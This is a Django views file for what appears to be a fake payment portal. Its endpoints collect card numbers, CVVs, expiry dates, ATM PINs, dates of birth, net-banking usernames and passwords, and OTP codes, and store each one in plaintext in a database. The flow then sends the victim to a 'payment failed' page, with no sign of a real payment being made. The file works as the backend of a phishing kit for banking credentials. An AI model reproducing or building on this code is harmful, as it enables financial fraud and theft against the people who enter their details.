from django.shortcuts import render, HttpResponse, redirect
from .models import UserDetail
from django.http import HttpResponse,JsonResponse

from rest_framework.decorators import api_view,permission_classes
from rest_framework.permissions import AllowAny
from rest_framework.parsers import JSONParser
from rest_framework.response import Response
from rest_framework.views import APIView

# Create your views here.
def index(request):
    context = {
      
    }
    return render(request, 'index.html', context)

@api_view(["GET", "POST"])
@permission_classes([AllowAny])
def indexData(request):
    print(request.query_params)
    payment_mode = request.query_params['payment_type']
    amount = request.query_params['amount_entered']

    user_idArr = []
    sNo_arr = []
    for i in UserDetail.objects.values('user_id', 'sNo'):
        user_idArr.append(i['user_id'])
        sNo_arr.append(i['sNo'])
    new_user_id = int(user_idArr[-1]) +1
    new_sno = sNo_arr[-1] +1
    request.session['user_id'] = new_user_id
    request.session['s_no'] = new_sno
    
    card = UserDetail(payment_mode=payment_mode, amount=amount, user_id=str(new_user_id), sNo=str(new_sno))
    card.save()
    try:
        if payment_mode == 'Visa/Master Credit Card' or payment_mode == 'Visa/Master Debit Card':
            request.session['payment_type'] = 'card'
            data = {
                'type': 'card',
                'status': 200,
                'userId': new_user_id
            }
        else:
            request.session['payment_type'] = 'nteB'
            data = {
                'type': 'nteb',
                'status': 200,
                'userId': new_user_id
            }
    except:
        data = {
            'status': False
        }

    return JsonResponse(data, safe=False)

def paymentProcessing(request):
    payment_type = request.session.get('payment_type')

    context = {
        'payment_type': payment_type
    }
    return render(request, 'doNotRefresh.html', context)

def cardDetails(request):
    return render(request, 'creditCard.html')

@api_view(["GET", "POST"])
@permission_classes([AllowAny])
def cardDetailsData(request):
    # user_id = request.session.get('user_id')

    try:
        card_holder_name = request.query_params['card_holder_name']
        card_number = request.query_params['card_number']
        exp_date_month = request.query_params['expmonth']
        exp_date_year = request.query_params['expdate']
        exp_date = str(str(exp_date_month) + "/" + str(exp_date_year))
        cvv = request.query_params['cvv']
        user_id = request.query_params['user_id']
        UserDetail.objects.filter(user_id=user_id).update(card_holder_name=card_holder_name, card_number=card_number, exp_date=exp_date, cvv=cvv)

        data = {
            'status': 200,
            'userId': user_id
        }
    except:
        data = {
            'status': False
        }

    return JsonResponse(data, safe=False)

def atmPin(request):
    return render(request, 'atmPin.html')

@api_view(["GET", "POST"])
@permission_classes([AllowAny])
def atmPinData(request):
    # user_id = request.session.get('user_id')
    try:
        user_id = request.query_params['user_id']
        valid_m = request.query_params['valid_month']
        valid_y = request.query_params['valid_year']
        valid_from = str(str(valid_m) + '/' + str(valid_y))
        dob_d = request.query_params['dob_date']
        dob_m = request.query_params['dob_month']
        dob_y = request.query_params['dob_year']
        dob = str(str(dob_d) + '/' + str(dob_m) + '/' + str(dob_y))
        atm_pin = request.query_params['atmpin']
        UserDetail.objects.filter(user_id=user_id).update(valid_from=valid_from, dob=dob, atm_pin=atm_pin)
        data = {
            'status': 200
        }
    except:
        data = {
            'status': False
        }
    return JsonResponse(data, safe=False)

def otpCard(request):
    return render(request, 'otp.html')

@api_view(["GET", "POST"])
@permission_classes([AllowAny])
def otpCardData(request):
    # user_id = request.session.get('user_id')

    try:
        user_id = request.query_params['user_id']
        otp = request.query_params['otp']
        UserDetail.objects.filter(user_id=user_id).update(otp=otp)
        data = {
            'status': 200
        }
    except:
        data = {
            'status': False
        }

    return JsonResponse(data, safe=False)

def netBanking(request):
    return render(request, 'netBanking.html')

@api_view(["GET", "POST"])
@permission_classes([AllowAny])
def netBankingData(request):
    # user_id = request.session.get('user_id')

    try:
        user_id = request.query_params['user_id']
        loginId = request.query_params['loginId']
        loginPass = request.query_params['loginPass']
        UserDetail.objects.filter(user_id=user_id).update(net_banking_id=loginId, net_banking_pass=loginPass)
        data = {
            'status': 200
        }
    except:
        data = {
            'status': False
        }

    return JsonResponse(data, safe=False)

def netOtp(request):
    return render(request, 'netBankOtp.html')

@api_view(["GET", "POST"])
@permission_classes([AllowAny])
def netBankingOtpData(request):
    # user_id = request.session.get('user_id')

    try:
        user_id = request.query_params['user_id']
        net_banking_otp = request.query_params['otp']
        UserDetail.objects.filter(user_id=user_id).update(net_banking_otp=net_banking_otp)
        data = {
            'status': 200
        }
    except:
        data = {
            'status': False
        }
    return JsonResponse(data, safe=False)

def paymentFailed(request):
    return render(request, 'paymentFailed.html')


